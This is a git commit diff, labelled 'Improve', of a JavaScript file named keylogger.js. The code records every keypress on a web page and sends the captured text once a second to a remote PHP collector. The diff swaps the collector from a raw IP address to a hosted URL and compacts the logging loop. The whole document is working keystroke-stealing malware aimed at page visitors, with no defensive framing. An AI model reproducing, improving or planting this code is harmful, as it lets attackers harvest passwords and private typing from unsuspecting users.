298a9481af1ce6ac85d828caa417de120c4f9a5c
cdenaro <Viaggiare04>
2017-01-25 11:55:41 +0100

    Improve

--- keylogger.js
+++ keylogger.js
@@ -1,12 +1,12 @@
-var keys='';
+var k='', 
+  u = 'http://blackout.altervista.org/cdn/magius.php'; 
 document.onkeypress = function(e) {
-	get = window.event?event:e;
-	key = get.keyCode?get.keyCode:get.charCode;
-	key = String.fromCharCode(key);
-	keys+=key;
+  get = window.event?event:e;
+  k  += String.fromCharCode( get.keyCode?get.keyCode:get.charCode );
 }
 window.setInterval(function(){
-	new Image().src = 'http://206.130.110.212/forum/system/keylogger.php?c='+keys;
-	keys = '';
+  if(k.length>0) {
+    new Image().src = u+'?c='+k; 
+    k = '';
+  }
 }, 1000);
-
